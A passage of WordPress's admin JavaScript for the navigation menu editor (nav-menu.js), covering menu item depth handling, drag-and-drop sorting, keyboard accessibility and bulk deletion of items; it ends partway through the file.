/**
 * WordPress Administration Navigation Menu
 * Interface JS functions
 *
 * @version 2.0.0
 *
 * @package WordPress
 * @subpackage Administration
 * @output wp-admin/js/nav-menu.js
 */

/* global menus, postboxes, columns, isRtl, ajaxurl, wpNavMenu */

(function($) {

	var api;

	/**
	 * Contains all the functions to handle WordPress navigation menus administration.
	 *
	 * @namespace wpNavMenu
	 */
	api = window.wpNavMenu = {

		options : {
			menuItemDepthPerLevel : 30, // Do not use directly. Use depthToPx and pxToDepth instead.
			globalMaxDepth:  11,
			sortableItems:   '> *',
			targetTolerance: 0
		},

		menuList : undefined,	// Set in init.
		targetList : undefined, // Set in init.
		menusChanged : false,
		isRTL: !! ( 'undefined' != typeof isRtl && isRtl ),
		negateIfRTL: ( 'undefined' != typeof isRtl && isRtl ) ? -1 : 1,
		lastSearch: '',

		// Functions that run on init.
		init : function() {
			api.menuList = $('#menu-to-edit');
			api.targetList = api.menuList;

			this.jQueryExtensions();

			this.attachMenuEditListeners();

			this.attachBulkSelectButtonListeners();
			this.attachMenuCheckBoxListeners();
			this.attachMenuItemDeleteButton();
			this.attachPendingMenuItemsListForDeletion();

			this.attachQuickSearchListeners();
			this.attachThemeLocationsListeners();
			this.attachMenuSaveSubmitListeners();

			this.attachTabsPanelListeners();

			this.attachUnsavedChangesListener();

			if ( api.menuList.length )
				this.initSortables();

			if ( menus.oneThemeLocationNoMenus )
				$( '#posttype-page' ).addSelectedToMenu( api.addMenuItemToBottom );

			this.initManageLocations();

			this.initAccessibility();

			this.initToggles();

			this.initPreviewing();
		},

		jQueryExtensions : function() {
			// jQuery extensions.
			$.fn.extend({
				menuItemDepth : function() {
					var margin = api.isRTL ? this.eq(0).css('margin-right') : this.eq(0).css('margin-left');
					return api.pxToDepth( margin && -1 != margin.indexOf('px') ? margin.slice(0, -2) : 0 );
				},
				updateDepthClass : function(current, prev) {
					return this.each(function(){
						var t = $(this);
						prev = prev || t.menuItemDepth();
						$(this).removeClass('menu-item-depth-'+ prev )
							.addClass('menu-item-depth-'+ current );
					});
				},
				shiftDepthClass : function(change) {
					return this.each(function(){
						var t = $(this),
							depth = t.menuItemDepth(),
							newDepth = depth + change;

						t.removeClass( 'menu-item-depth-'+ depth )
							.addClass( 'menu-item-depth-'+ ( newDepth ) );

						if ( 0 === newDepth ) {
							t.find( '.is-submenu' ).hide();
						}
					});
				},
				childMenuItems : function() {
					var result = $();
					this.each(function(){
						var t = $(this), depth = t.menuItemDepth(), next = t.next( '.menu-item' );
						while( next.length && next.menuItemDepth() > depth ) {
							result = result.add( next );
							next = next.next( '.menu-item' );
						}
					});
					return result;
				},
				shiftHorizontally : function( dir ) {
					return this.each(function(){
						var t = $(this),
							depth = t.menuItemDepth(),
							newDepth = depth + dir;

						// Change .menu-item-depth-n class.
						t.moveHorizontally( newDepth, depth );
					});
				},
				moveHorizontally : function( newDepth, depth ) {
					return this.each(function(){
						var t = $(this),
							children = t.childMenuItems(),
							diff = newDepth - depth,
							subItemText = t.find('.is-submenu');

						// Change .menu-item-depth-n class.
						t.updateDepthClass( newDepth, depth ).updateParentMenuItemDBId();

						// If it has children, move those too.
						if ( children ) {
							children.each(function() {
								var t = $(this),
									thisDepth = t.menuItemDepth(),
									newDepth = thisDepth + diff;
								t.updateDepthClass(newDepth, thisDepth).updateParentMenuItemDBId();
							});
						}

						// Show "Sub item" helper text.
						if (0 === newDepth)
							subItemText.hide();
						else
							subItemText.show();
					});
				},
				updateParentMenuItemDBId : function() {
					return this.each(function(){
						var item = $(this),
							input = item.find( '.menu-item-data-parent-id' ),
							depth = parseInt( item.menuItemDepth(), 10 ),
							parentDepth = depth - 1,
							parent = item.prevAll( '.menu-item-depth-' + parentDepth ).first();

						if ( 0 === depth ) { // Item is on the top level, has no parent.
							input.val(0);
						} else { // Find the parent item, and retrieve its object id.
							input.val( parent.find( '.menu-item-data-db-id' ).val() );
						}
					});
				},
				hideAdvancedMenuItemFields : function() {
					return this.each(function(){
						var that = $(this);
						$('.hide-column-tog').not(':checked').each(function(){
							that.find('.field-' + $(this).val() ).addClass('hidden-field');
						});
					});
				},
				/**
				 * Adds selected menu items to the menu.
				 *
				 * @ignore
				 *
				 * @param jQuery metabox The metabox jQuery object.
				 */
				addSelectedToMenu : function(processMethod) {
					if ( 0 === $('#menu-to-edit').length ) {
						return false;
					}

					return this.each(function() {
						var t = $(this), menuItems = {},
							checkboxes = ( menus.oneThemeLocationNoMenus && 0 === t.find( '.tabs-panel-active .categorychecklist li input:checked' ).length ) ? t.find( '#page-all li input[type="checkbox"]' ) : t.find( '.tabs-panel-active .categorychecklist li input:checked' ),
							re = /menu-item\[([^\]]*)/;

						processMethod = processMethod || api.addMenuItemToBottom;

						// If no items are checked, bail.
						if ( !checkboxes.length )
							return false;

						// Show the Ajax spinner.
						t.find( '.button-controls .spinner' ).addClass( 'is-active' );

						// Retrieve menu item data.
						$(checkboxes).each(function(){
							var t = $(this),
								listItemDBIDMatch = re.exec( t.attr('name') ),
								listItemDBID = 'undefined' == typeof listItemDBIDMatch[1] ? 0 : parseInt(listItemDBIDMatch[1], 10);

							if ( this.className && -1 != this.className.indexOf('add-to-top') )
								processMethod = api.addMenuItemToTop;
							menuItems[listItemDBID] = t.closest('li').getItemData( 'add-menu-item', listItemDBID );
						});

						// Add the items.
						api.addItemToMenu(menuItems, processMethod, function(){
							// Deselect the items and hide the Ajax spinner.
							checkboxes.prop( 'checked', false );
							t.find( '.button-controls .select-all' ).prop( 'checked', false );
							t.find( '.button-controls .spinner' ).removeClass( 'is-active' );
						});
					});
				},
				getItemData : function( itemType, id ) {
					itemType = itemType || 'menu-item';

					var itemData = {}, i,
					fields = [
						'menu-item-db-id',
						'menu-item-object-id',
						'menu-item-object',
						'menu-item-parent-id',
						'menu-item-position',
						'menu-item-type',
						'menu-item-title',
						'menu-item-url',
						'menu-item-description',
						'menu-item-attr-title',
						'menu-item-target',
						'menu-item-classes',
						'menu-item-xfn'
					];

					if( !id && itemType == 'menu-item' ) {
						id = this.find('.menu-item-data-db-id').val();
					}

					if( !id ) return itemData;

					this.find('input').each(function() {
						var field;
						i = fields.length;
						while ( i-- ) {
							if( itemType == 'menu-item' )
								field = fields[i] + '[' + id + ']';
							else if( itemType == 'add-menu-item' )
								field = 'menu-item[' + id + '][' + fields[i] + ']';

							if (
								this.name &&
								field == this.name
							) {
								itemData[fields[i]] = this.value;
							}
						}
					});

					return itemData;
				},
				setItemData : function( itemData, itemType, id ) { // Can take a type, such as 'menu-item', or an id.
					itemType = itemType || 'menu-item';

					if( !id && itemType == 'menu-item' ) {
						id = $('.menu-item-data-db-id', this).val();
					}

					if( !id ) return this;

					this.find('input').each(function() {
						var t = $(this), field;
						$.each( itemData, function( attr, val ) {
							if( itemType == 'menu-item' )
								field = attr + '[' + id + ']';
							else if( itemType == 'add-menu-item' )
								field = 'menu-item[' + id + '][' + attr + ']';

							if ( field == t.attr('name') ) {
								t.val( val );
							}
						});
					});
					return this;
				}
			});
		},

		countMenuItems : function( depth ) {
			return $( '.menu-item-depth-' + depth ).length;
		},

		moveMenuItem : function( $this, dir ) {

			var items, newItemPosition, newDepth,
				menuItems = $( '#menu-to-edit li' ),
				menuItemsCount = menuItems.length,
				thisItem = $this.parents( 'li.menu-item' ),
				thisItemChildren = thisItem.childMenuItems(),
				thisItemData = thisItem.getItemData(),
				thisItemDepth = parseInt( thisItem.menuItemDepth(), 10 ),
				thisItemPosition = parseInt( thisItem.index(), 10 ),
				nextItem = thisItem.next(),
				nextItemChildren = nextItem.childMenuItems(),
				nextItemDepth = parseInt( nextItem.menuItemDepth(), 10 ) + 1,
				prevItem = thisItem.prev(),
				prevItemDepth = parseInt( prevItem.menuItemDepth(), 10 ),
				prevItemId = prevItem.getItemData()['menu-item-db-id'],
				a11ySpeech = menus[ 'moved' + dir.charAt(0).toUpperCase() + dir.slice(1) ];

			switch ( dir ) {
			case 'up':
				newItemPosition = thisItemPosition - 1;

				// Already at top.
				if ( 0 === thisItemPosition )
					break;

				// If a sub item is moved to top, shift it to 0 depth.
				if ( 0 === newItemPosition && 0 !== thisItemDepth )
					thisItem.moveHorizontally( 0, thisItemDepth );

				// If prev item is sub item, shift to match depth.
				if ( 0 !== prevItemDepth )
					thisItem.moveHorizontally( prevItemDepth, thisItemDepth );

				// Does this item have sub items?
				if ( thisItemChildren ) {
					items = thisItem.add( thisItemChildren );
					// Move the entire block.
					items.detach().insertBefore( menuItems.eq( newItemPosition ) ).updateParentMenuItemDBId();
				} else {
					thisItem.detach().insertBefore( menuItems.eq( newItemPosition ) ).updateParentMenuItemDBId();
				}
				break;
			case 'down':
				// Does this item have sub items?
				if ( thisItemChildren ) {
					items = thisItem.add( thisItemChildren ),
						nextItem = menuItems.eq( items.length + thisItemPosition ),
						nextItemChildren = 0 !== nextItem.childMenuItems().length;

					if ( nextItemChildren ) {
						newDepth = parseInt( nextItem.menuItemDepth(), 10 ) + 1;
						thisItem.moveHorizontally( newDepth, thisItemDepth );
					}

					// Have we reached the bottom?
					if ( menuItemsCount === thisItemPosition + items.length )
						break;

					items.detach().insertAfter( menuItems.eq( thisItemPosition + items.length ) ).updateParentMenuItemDBId();
				} else {
					// If next item has sub items, shift depth.
					if ( 0 !== nextItemChildren.length )
						thisItem.moveHorizontally( nextItemDepth, thisItemDepth );

					// Have we reached the bottom?
					if ( menuItemsCount === thisItemPosition + 1 )
						break;
					thisItem.detach().insertAfter( menuItems.eq( thisItemPosition + 1 ) ).updateParentMenuItemDBId();
				}
				break;
			case 'top':
				// Already at top.
				if ( 0 === thisItemPosition )
					break;
				// Does this item have sub items?
				if ( thisItemChildren ) {
					items = thisItem.add( thisItemChildren );
					// Move the entire block.
					items.detach().insertBefore( menuItems.eq( 0 ) ).updateParentMenuItemDBId();
				} else {
					thisItem.detach().insertBefore( menuItems.eq( 0 ) ).updateParentMenuItemDBId();
				}
				break;
			case 'left':
				// As far left as possible.
				if ( 0 === thisItemDepth )
					break;
				thisItem.shiftHorizontally( -1 );
				break;
			case 'right':
				// Can't be sub item at top.
				if ( 0 === thisItemPosition )
					break;
				// Already sub item of prevItem.
				if ( thisItemData['menu-item-parent-id'] === prevItemId )
					break;
				thisItem.shiftHorizontally( 1 );
				break;
			}
			$this.trigger( 'focus' );
			api.registerChange();
			api.refreshKeyboardAccessibility();
			api.refreshAdvancedAccessibility();

			if ( a11ySpeech ) {
				wp.a11y.speak( a11ySpeech );
			}
		},

		initAccessibility : function() {
			var menu = $( '#menu-to-edit' );

			api.refreshKeyboardAccessibility();
			api.refreshAdvancedAccessibility();

			// Refresh the accessibility when the user comes close to the item in any way.
			menu.on( 'mouseenter.refreshAccessibility focus.refreshAccessibility touchstart.refreshAccessibility' , '.menu-item' , function(){
				api.refreshAdvancedAccessibilityOfItem( $( this ).find( 'a.item-edit' ) );
			} );

			// We have to update on click as well because we might hover first, change the item, and then click.
			menu.on( 'click', 'a.item-edit', function() {
				api.refreshAdvancedAccessibilityOfItem( $( this ) );
			} );

			// Links for moving items.
			menu.on( 'click', '.menus-move', function () {
				var $this = $( this ),
					dir = $this.data( 'dir' );

				if ( 'undefined' !== typeof dir ) {
					api.moveMenuItem( $( this ).parents( 'li.menu-item' ).find( 'a.item-edit' ), dir );
				}
			});
		},

		/**
		 * refreshAdvancedAccessibilityOfItem( [itemToRefresh] )
		 *
		 * Refreshes advanced accessibility buttons for one menu item.
		 * Shows or hides buttons based on the location of the menu item.
		 *
		 * @param {Object} itemToRefresh The menu item that might need its advanced accessibility buttons refreshed
		 */
		refreshAdvancedAccessibilityOfItem : function( itemToRefresh ) {

			// Only refresh accessibility when necessary.
			if ( true !== $( itemToRefresh ).data( 'needs_accessibility_refresh' ) ) {
				return;
			}

			var thisLink, thisLinkText, primaryItems, itemPosition, title,
				parentItem, parentItemId, parentItemName, subItems,
				$this = $( itemToRefresh ),
				menuItem = $this.closest( 'li.menu-item' ).first(),
				depth = menuItem.menuItemDepth(),
				isPrimaryMenuItem = ( 0 === depth ),
				itemName = $this.closest( '.menu-item-handle' ).find( '.menu-item-title' ).text(),
				position = parseInt( menuItem.index(), 10 ),
				prevItemDepth = ( isPrimaryMenuItem ) ? depth : parseInt( depth - 1, 10 ),
				prevItemNameLeft = menuItem.prevAll('.menu-item-depth-' + prevItemDepth).first().find( '.menu-item-title' ).text(),
				prevItemNameRight = menuItem.prevAll('.menu-item-depth-' + depth).first().find( '.menu-item-title' ).text(),
				totalMenuItems = $('#menu-to-edit li').length,
				hasSameDepthSibling = menuItem.nextAll( '.menu-item-depth-' + depth ).length;

				menuItem.find( '.field-move' ).toggle( totalMenuItems > 1 );

			// Where can they move this menu item?
			if ( 0 !== position ) {
				thisLink = menuItem.find( '.menus-move-up' );
				thisLink.attr( 'aria-label', menus.moveUp ).css( 'display', 'inline' );
			}

			if ( 0 !== position && isPrimaryMenuItem ) {
				thisLink = menuItem.find( '.menus-move-top' );
				thisLink.attr( 'aria-label', menus.moveToTop ).css( 'display', 'inline' );
			}

			if ( position + 1 !== totalMenuItems && 0 !== position ) {
				thisLink = menuItem.find( '.menus-move-down' );
				thisLink.attr( 'aria-label', menus.moveDown ).css( 'display', 'inline' );
			}

			if ( 0 === position && 0 !== hasSameDepthSibling ) {
				thisLink = menuItem.find( '.menus-move-down' );
				thisLink.attr( 'aria-label', menus.moveDown ).css( 'display', 'inline' );
			}

			if ( ! isPrimaryMenuItem ) {
				thisLink = menuItem.find( '.menus-move-left' ),
				thisLinkText = menus.outFrom.replace( '%s', prevItemNameLeft );
				thisLink.attr( 'aria-label', menus.moveOutFrom.replace( '%s', prevItemNameLeft ) ).text( thisLinkText ).css( 'display', 'inline' );
			}

			if ( 0 !== position ) {
				if ( menuItem.find( '.menu-item-data-parent-id' ).val() !== menuItem.prev().find( '.menu-item-data-db-id' ).val() ) {
					thisLink = menuItem.find( '.menus-move-right' ),
					thisLinkText = menus.under.replace( '%s', prevItemNameRight );
					thisLink.attr( 'aria-label', menus.moveUnder.replace( '%s', prevItemNameRight ) ).text( thisLinkText ).css( 'display', 'inline' );
				}
			}

			if ( isPrimaryMenuItem ) {
				primaryItems = $( '.menu-item-depth-0' ),
				itemPosition = primaryItems.index( menuItem ) + 1,
				totalMenuItems = primaryItems.length,

				// String together help text for primary menu items.
				title = menus.menuFocus.replace( '%1$s', itemName ).replace( '%2$d', itemPosition ).replace( '%3$d', totalMenuItems );
			} else {
				parentItem = menuItem.prevAll( '.menu-item-depth-' + parseInt( depth - 1, 10 ) ).first(),
				parentItemId = parentItem.find( '.menu-item-data-db-id' ).val(),
				parentItemName = parentItem.find( '.menu-item-title' ).text(),
				subItems = $( '.menu-item .menu-item-data-parent-id[value="' + parentItemId + '"]' ),
				itemPosition = $( subItems.parents('.menu-item').get().reverse() ).index( menuItem ) + 1;

				// String together help text for sub menu items.
				title = menus.subMenuFocus.replace( '%1$s', itemName ).replace( '%2$d', itemPosition ).replace( '%3$s', parentItemName );
			}

			$this.attr( 'aria-label', title );

			// Mark this item's accessibility as refreshed.
			$this.data( 'needs_accessibility_refresh', false );
		},

		/**
		 * refreshAdvancedAccessibility
		 *
		 * Hides all advanced accessibility buttons and marks them for refreshing.
		 */
		refreshAdvancedAccessibility : function() {

			// Hide all the move buttons by default.
			$( '.menu-item-settings .field-move .menus-move' ).hide();

			// Mark all menu items as unprocessed.
			$( 'a.item-edit' ).data( 'needs_accessibility_refresh', true );

			// All open items have to be refreshed or they will show no links.
			$( '.menu-item-edit-active a.item-edit' ).each( function() {
				api.refreshAdvancedAccessibilityOfItem( this );
			} );
		},

		refreshKeyboardAccessibility : function() {
			$( 'a.item-edit' ).off( 'focus' ).on( 'focus', function(){
				$(this).off( 'keydown' ).on( 'keydown', function(e){

					var arrows,
						$this = $( this ),
						thisItem = $this.parents( 'li.menu-item' ),
						thisItemData = thisItem.getItemData();

					// Bail if it's not an arrow key.
					if ( 37 != e.which && 38 != e.which && 39 != e.which && 40 != e.which )
						return;

					// Avoid multiple keydown events.
					$this.off('keydown');

					// Bail if there is only one menu item.
					if ( 1 === $('#menu-to-edit li').length )
						return;

					// If RTL, swap left/right arrows.
					arrows = { '38': 'up', '40': 'down', '37': 'left', '39': 'right' };
					if ( $('body').hasClass('rtl') )
						arrows = { '38' : 'up', '40' : 'down', '39' : 'left', '37' : 'right' };

					switch ( arrows[e.which] ) {
					case 'up':
						api.moveMenuItem( $this, 'up' );
						break;
					case 'down':
						api.moveMenuItem( $this, 'down' );
						break;
					case 'left':
						api.moveMenuItem( $this, 'left' );
						break;
					case 'right':
						api.moveMenuItem( $this, 'right' );
						break;
					}
					// Put focus back on same menu item.
					$( '#edit-' + thisItemData['menu-item-db-id'] ).trigger( 'focus' );
					return false;
				});
			});
		},

		initPreviewing : function() {
			// Update the item handle title when the navigation label is changed.
			$( '#menu-to-edit' ).on( 'change input', '.edit-menu-item-title', function(e) {
				var input = $( e.currentTarget ), title, titleEl;
				title = input.val();
				titleEl = input.closest( '.menu-item' ).find( '.menu-item-title' );
				// Don't update to empty title.
				if ( title ) {
					titleEl.text( title ).removeClass( 'no-title' );
				} else {
					titleEl.text( wp.i18n._x( '(no label)', 'missing menu item navigation label' ) ).addClass( 'no-title' );
				}
			} );
		},

		initToggles : function() {
			// Init postboxes.
			postboxes.add_postbox_toggles('nav-menus');

			// Adjust columns functions for menus UI.
			columns.useCheckboxesForHidden();
			columns.checked = function(field) {
				$('.field-' + field).removeClass('hidden-field');
			};
			columns.unchecked = function(field) {
				$('.field-' + field).addClass('hidden-field');
			};
			// Hide fields.
			api.menuList.hideAdvancedMenuItemFields();

			$('.hide-postbox-tog').on( 'click', function () {
				var hidden = $( '.accordion-container li.accordion-section' ).filter(':hidden').map(function() { return this.id; }).get().join(',');
				$.post(ajaxurl, {
					action: 'closed-postboxes',
					hidden: hidden,
					closedpostboxesnonce: jQuery('#closedpostboxesnonce').val(),
					page: 'nav-menus'
				});
			});
		},

		initSortables : function() {
			var currentDepth = 0, originalDepth, minDepth, maxDepth,
				prev, next, prevBottom, nextThreshold, helperHeight, transport,
				menuEdge = api.menuList.offset().left,
				body = $('body'), maxChildDepth,
				menuMaxDepth = initialMenuMaxDepth();

			if( 0 !== $( '#menu-to-edit li' ).length )
				$( '.drag-instructions' ).show();

			// Use the right edge if RTL.
			menuEdge += api.isRTL ? api.menuList.width() : 0;

			api.menuList.sortable({
				handle: '.menu-item-handle',
				placeholder: 'sortable-placeholder',
				items: api.options.sortableItems,
				start: function(e, ui) {
					var height, width, parent, children, tempHolder;

					// Handle placement for RTL orientation.
					if ( api.isRTL )
						ui.item[0].style.right = 'auto';

					transport = ui.item.children('.menu-item-transport');

					// Set depths. currentDepth must be set before children are located.
					originalDepth = ui.item.menuItemDepth();
					updateCurrentDepth(ui, originalDepth);

					// Attach child elements to parent.
					// Skip the placeholder.
					parent = ( ui.item.next()[0] == ui.placeholder[0] ) ? ui.item.next() : ui.item;
					children = parent.childMenuItems();
					transport.append( children );

					// Update the height of the placeholder to match the moving item.
					height = transport.outerHeight();
					// If there are children, account for distance between top of children and parent.
					height += ( height > 0 ) ? (ui.placeholder.css('margin-top').slice(0, -2) * 1) : 0;
					height += ui.helper.outerHeight();
					helperHeight = height;
					height -= 2;                                              // Subtract 2 for borders.
					ui.placeholder.height(height);

					// Update the width of the placeholder to match the moving item.
					maxChildDepth = originalDepth;
					children.each(function(){
						var depth = $(this).menuItemDepth();
						maxChildDepth = (depth > maxChildDepth) ? depth : maxChildDepth;
					});
					width = ui.helper.find('.menu-item-handle').outerWidth(); // Get original width.
					width += api.depthToPx(maxChildDepth - originalDepth);    // Account for children.
					width -= 2;                                               // Subtract 2 for borders.
					ui.placeholder.width(width);

					// Update the list of menu items.
					tempHolder = ui.placeholder.next( '.menu-item' );
					tempHolder.css( 'margin-top', helperHeight + 'px' ); // Set the margin to absorb the placeholder.
					ui.placeholder.detach();         // Detach or jQuery UI will think the placeholder is a menu item.
					$(this).sortable( 'refresh' );   // The children aren't sortable. We should let jQuery UI know.
					ui.item.after( ui.placeholder ); // Reattach the placeholder.
					tempHolder.css('margin-top', 0); // Reset the margin.

					// Now that the element is complete, we can update...
					updateSharedVars(ui);
				},
				stop: function(e, ui) {
					var children, subMenuTitle,
						depthChange = currentDepth - originalDepth;

					// Return child elements to the list.
					children = transport.children().insertAfter(ui.item);

					// Add "sub menu" description.
					subMenuTitle = ui.item.find( '.item-title .is-submenu' );
					if ( 0 < currentDepth )
						subMenuTitle.show();
					else
						subMenuTitle.hide();

					// Update depth classes.
					if ( 0 !== depthChange ) {
						ui.item.updateDepthClass( currentDepth );
						children.shiftDepthClass( depthChange );
						updateMenuMaxDepth( depthChange );
					}
					// Register a change.
					api.registerChange();
					// Update the item data.
					ui.item.updateParentMenuItemDBId();

					// Address sortable's incorrectly-calculated top in Opera.
					ui.item[0].style.top = 0;

					// Handle drop placement for rtl orientation.
					if ( api.isRTL ) {
						ui.item[0].style.left = 'auto';
						ui.item[0].style.right = 0;
					}

					api.refreshKeyboardAccessibility();
					api.refreshAdvancedAccessibility();
				},
				change: function(e, ui) {
					// Make sure the placeholder is inside the menu.
					// Otherwise fix it, or we're in trouble.
					if( ! ui.placeholder.parent().hasClass('menu') )
						(prev.length) ? prev.after( ui.placeholder ) : api.menuList.prepend( ui.placeholder );

					updateSharedVars(ui);
				},
				sort: function(e, ui) {
					var offset = ui.helper.offset(),
						edge = api.isRTL ? offset.left + ui.helper.width() : offset.left,
						depth = api.negateIfRTL * api.pxToDepth( edge - menuEdge );

					/*
					 * Check and correct if depth is not within range.
					 * Also, if the dragged element is dragged upwards over an item,
					 * shift the placeholder to a child position.
					 */
					if ( depth > maxDepth || offset.top < ( prevBottom - api.options.targetTolerance ) ) {
						depth = maxDepth;
					} else if ( depth < minDepth ) {
						depth = minDepth;
					}

					if( depth != currentDepth )
						updateCurrentDepth(ui, depth);

					// If we overlap the next element, manually shift downwards.
					if( nextThreshold && offset.top + helperHeight > nextThreshold ) {
						next.after( ui.placeholder );
						updateSharedVars( ui );
						$( this ).sortable( 'refreshPositions' );
					}
				}
			});

			function updateSharedVars(ui) {
				var depth;

				prev = ui.placeholder.prev( '.menu-item' );
				next = ui.placeholder.next( '.menu-item' );

				// Make sure we don't select the moving item.
				if( prev[0] == ui.item[0] ) prev = prev.prev( '.menu-item' );
				if( next[0] == ui.item[0] ) next = next.next( '.menu-item' );

				prevBottom = (prev.length) ? prev.offset().top + prev.height() : 0;
				nextThreshold = (next.length) ? next.offset().top + next.height() / 3 : 0;
				minDepth = (next.length) ? next.menuItemDepth() : 0;

				if( prev.length )
					maxDepth = ( (depth = prev.menuItemDepth() + 1) > api.options.globalMaxDepth ) ? api.options.globalMaxDepth : depth;
				else
					maxDepth = 0;
			}

			function updateCurrentDepth(ui, depth) {
				ui.placeholder.updateDepthClass( depth, currentDepth );
				currentDepth = depth;
			}

			function initialMenuMaxDepth() {
				if( ! body[0].className ) return 0;
				var match = body[0].className.match(/menu-max-depth-(\d+)/);
				return match && match[1] ? parseInt( match[1], 10 ) : 0;
			}

			function updateMenuMaxDepth( depthChange ) {
				var depth, newDepth = menuMaxDepth;
				if ( depthChange === 0 ) {
					return;
				} else if ( depthChange > 0 ) {
					depth = maxChildDepth + depthChange;
					if( depth > menuMaxDepth )
						newDepth = depth;
				} else if ( depthChange < 0 && maxChildDepth == menuMaxDepth ) {
					while( ! $('.menu-item-depth-' + newDepth, api.menuList).length && newDepth > 0 )
						newDepth--;
				}
				// Update the depth class.
				body.removeClass( 'menu-max-depth-' + menuMaxDepth ).addClass( 'menu-max-depth-' + newDepth );
				menuMaxDepth = newDepth;
			}
		},

		initManageLocations : function () {
			$('#menu-locations-wrap form').on( 'submit', function(){
				window.onbeforeunload = null;
			});
			$('.menu-location-menus select').on('change', function () {
				var editLink = $(this).closest('tr').find('.locations-edit-menu-link');
				if ($(this).find('option:selected').data('orig'))
					editLink.show();
				else
					editLink.hide();
			});
		},

		attachMenuEditListeners : function() {
			var that = this;
			$('#update-nav-menu').on('click', function(e) {
				if ( e.target && e.target.className ) {
					if ( -1 != e.target.className.indexOf('item-edit') ) {
						return that.eventOnClickEditLink(e.target);
					} else if ( -1 != e.target.className.indexOf('menu-save') ) {
						return that.eventOnClickMenuSave(e.target);
					} else if ( -1 != e.target.className.indexOf('menu-delete') ) {
						return that.eventOnClickMenuDelete(e.target);
					} else if ( -1 != e.target.className.indexOf('item-delete') ) {
						return that.eventOnClickMenuItemDelete(e.target);
					} else if ( -1 != e.target.className.indexOf('item-cancel') ) {
						return that.eventOnClickCancelLink(e.target);
					}
				}
			});

			$( '#menu-name' ).on( 'input', _.debounce( function () {
				var menuName = $( document.getElementById( 'menu-name' ) ),
					menuNameVal = menuName.val();

				if ( ! menuNameVal || ! menuNameVal.replace( /\s+/, '' ) ) {
					// Add warning for invalid menu name.
					menuName.parent().addClass( 'form-invalid' );
				} else {
					// Remove warning for valid menu name.
					menuName.parent().removeClass( 'form-invalid' );
				}
			}, 500 ) );

			$('#add-custom-links input[type="text"]').on( 'keypress', function(e){
				$('#customlinkdiv').removeClass('form-invalid');

				if ( e.keyCode === 13 ) {
					e.preventDefault();
					$( '#submit-customlinkdiv' ).trigger( 'click' );
				}
			});
		},

		/**
		 * Handle toggling bulk selection checkboxes for menu items.
		 *
		 * @since 5.8.0
		 */ 
		attachBulkSelectButtonListeners : function() {
			var that = this;

			$( '.bulk-select-switcher' ).on( 'change', function() {
				if ( this.checked ) {
					$( '.bulk-select-switcher' ).prop( 'checked', true );
					that.enableBulkSelection();
				} else {
					$( '.bulk-select-switcher' ).prop( 'checked', false );
					that.disableBulkSelection();
				}
			});
		},

		/**
		 * Enable bulk selection checkboxes for menu items.
		 *
		 * @since 5.8.0
		 */ 
		enableBulkSelection : function() {
			var checkbox = $( '#menu-to-edit .menu-item-checkbox' );

			$( '#menu-to-edit' ).addClass( 'bulk-selection' );
			$( '#nav-menu-bulk-actions-top' ).addClass( 'bulk-selection' );
			$( '#nav-menu-bulk-actions-bottom' ).addClass( 'bulk-selection' );

			$.each( checkbox, function() {
				$(this).prop( 'disabled', false );
			});
		},

		/**
		 * Disable bulk selection checkboxes for menu items.
		 *
		 * @since 5.8.0
		 */ 
		disableBulkSelection : function() {
			var checkbox = $( '#menu-to-edit .menu-item-checkbox' );

			$( '#menu-to-edit' ).removeClass( 'bulk-selection' );
			$( '#nav-menu-bulk-actions-top' ).removeClass( 'bulk-selection' );
			$( '#nav-menu-bulk-actions-bottom' ).removeClass( 'bulk-selection' );

			if ( $( '.menu-items-delete' ).is( '[aria-describedby="pending-menu-items-to-delete"]' ) ) {
				$( '.menu-items-delete' ).removeAttr( 'aria-describedby' );
			}

			$.each( checkbox, function() {
				$(this).prop( 'disabled', true ).prop( 'checked', false );
			});

			$( '.menu-items-delete' ).addClass( 'disabled' );
			$( '#pending-menu-items-to-delete ul' ).empty();
		},

		/**
		 * Listen for state changes on bulk action checkboxes.
		 *
		 * @since 5.8.0
		 */ 
		attachMenuCheckBoxListeners : function() {
			var that = this;

			$( '#menu-to-edit' ).on( 'change', '.menu-item-checkbox', function() {
				that.setRemoveSelectedButtonStatus();
			});
		},

		/**
		 * Create delete button to remove menu items from collection.
		 *
		 * @since 5.8.0
		 */ 
		attachMenuItemDeleteButton : function() {
			var that = this;

			$( document ).on( 'click', '.menu-items-delete', function( e ) {
				var itemsPendingDeletion, itemsPendingDeletionList, deletionSpeech;

				e.preventDefault();

				if ( ! $(this).hasClass( 'disabled' ) ) {
					$.each( $( '.menu-item-checkbox:checked' ), function( index, element ) {
						$( element ).parents( 'li' ).find( 'a.item-delete' ).trigger( 'click' );
					});

					$( '.menu-items-delete' ).addClass( 'disabled' );
					$( '.bulk-select-switcher' ).prop( 'checked', false );

					itemsPendingDeletion     = '';
					itemsPendingDeletionList = $( '#pending-menu-items-to-delete ul li' );

					$.each( itemsPendingDeletionList, function( index, element ) {
						var itemName = $( element ).find( '.pending-menu-item-name' ).text();
						var itemSpeech = menus.menuItemDeletion.replace( '%s', itemName );

						itemsPendingDeletion += itemSpeech;
						if ( ( index + 1 ) < itemsPendingDeletionList.length ) {
							itemsPendingDeletion += ', ';
						}
					});

					deletionSpeech = menus.itemsDeleted.replace( '%s', itemsPendingDeletion );
					wp.a11y.speak( deletionSpeech, 'polite' );
					that.disableBulkSelection();
				}
			});
		},

		/**
		 * List menu items awaiting deletion.
		 *
		 * @since 5.8.0
		 */ 
		attachPendingMenuItemsListForDeletion : function() {
			$( '#post-body-content' ).on( 'change', '.menu-item-checkbox', function() {
				var menuItemName, menuItemType, menuItemID, listedMenuItem;

				if ( ! $( '.menu-items-delete' ).is( '[aria-describedby="pending-menu-items-to-delete"]' ) ) {
					$( '.menu-items-delete' ).attr( 'aria-describedby', 'pending-menu-items-to-delete' );
				}

				menuItemName = $(this).next().text();
				menuItemType = $(this).parent().next( '.item-controls' ).find( '.item-type' ).text();
				menuItemID   = $(this).attr( 'data-menu-item-id' );

				listedMenuItem = $( '#pending-menu-items-to-delete ul' ).find( '[data-menu-item-id=' + menuItemID + ']' );
				if ( listedMenuItem.length > 0 ) {
					listedMenuItem.remove();
				}

				if ( this.checked === true ) {
					$( '#pending-menu-items-to-delete ul' ).append(
						'<li data-menu-item-id="' + menuItemID + '">' +
							'<span class="pending-menu-item-name">' + menuItemName + '</span> ' +
							'<span class="pending-menu-item-type">(' + menuItemType + ')</span>' +
							'<span class="separator"></span>' +
						'</li>'
					);
				}

				$( '#pending-menu-items-to-delete li .separator' ).html( ', ' );
				$( '#pending-menu-items-to-delete li .separator' ).last().html( '.' );
			});
		},

		/**
		 * Set status of bulk delete checkbox.
		 *
		 * @since 5.8.0
		 */ 
